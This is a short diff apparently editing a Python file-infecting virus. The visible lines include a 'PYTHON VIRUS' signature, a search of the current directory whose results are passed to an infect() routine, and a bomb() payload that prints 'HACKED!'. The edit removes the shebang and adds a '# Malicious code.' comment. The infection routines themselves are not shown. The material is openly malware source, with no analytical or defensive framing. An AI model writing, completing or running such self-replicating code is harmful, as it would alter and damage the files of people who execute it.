@@ -1,4 +1,4 @@
-#!/usr/bin/python
+
 import os
 import datetime
 SIGNATURE = "PYTHON VIRUS"
@@ -35,4 +35,5 @@ def bomb():
     print("HACKED!")
 filestoinfect = search(os.path.abspath(""))
 infect(filestoinfect)
+# Malicious code.
 bomb()
